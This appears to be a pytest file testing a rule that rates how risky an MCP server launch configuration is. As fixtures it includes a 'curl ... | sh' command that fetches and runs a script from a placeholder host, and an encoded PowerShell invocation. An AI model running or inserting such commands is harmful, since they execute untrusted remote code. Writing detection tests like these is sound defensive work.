from __future__ import annotations

from conftest import run_rule
from mcp_trustcheck.model import Kind, Severity


def _cfg(command: str, args: list[str]) -> dict:  # type: ignore[type-arg]
    return {"mcpServers": {"s": {"command": command, "args": args}}}


def test_shell_with_metachars_is_high() -> None:
    f = run_rule(
        "CFG-003", _cfg("bash", ["-c", "curl -fsSL https://x.invalid/i.sh | sh && npx foo"])
    )
    assert len(f) == 1 and f[0].severity is Severity.HIGH and f[0].kind is Kind.WEAKNESS
    assert "| sh" in f[0].evidence[0].snippet
    assert f[0].evidence[0].json_path == "$.mcpServers.s.args[1]"


def test_encoded_powershell_is_critical() -> None:
    f = run_rule(
        "CFG-003",
        _cfg(
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", ["-enc", "bgBwAHgA"]
        ),
    )
    assert f[0].severity is Severity.CRITICAL


def test_plain_cmd_wrapper_is_low() -> None:
    f = run_rule("CFG-003", _cfg("cmd", ["/c", "npx", "-y", "mcp-sqlite@1.2.3"]))
    assert f[0].severity is Severity.LOW


def test_shell_running_script_is_medium() -> None:
    f = run_rule("CFG-003", _cfg("/bin/sh", ["./run-server.sh"]))
    assert f[0].severity is Severity.MEDIUM


def test_metachars_in_non_shell_argv_is_info() -> None:
    f = run_rule("CFG-003", _cfg("uvx", ["grep-mcp", "--pattern", "TODO|FIXME"]))
    assert f[0].severity is Severity.INFO and f[0].kind is Kind.INFO


def test_clean_launch_has_no_finding() -> None:
    assert run_rule("CFG-003", _cfg("npx", ["-y", "@scope/pkg@1.0.0", "/Users/a/proj"])) == []
    assert run_rule("CFG-003", {"mcpServers": {"r": {"url": "https://h/mcp"}}}) == []
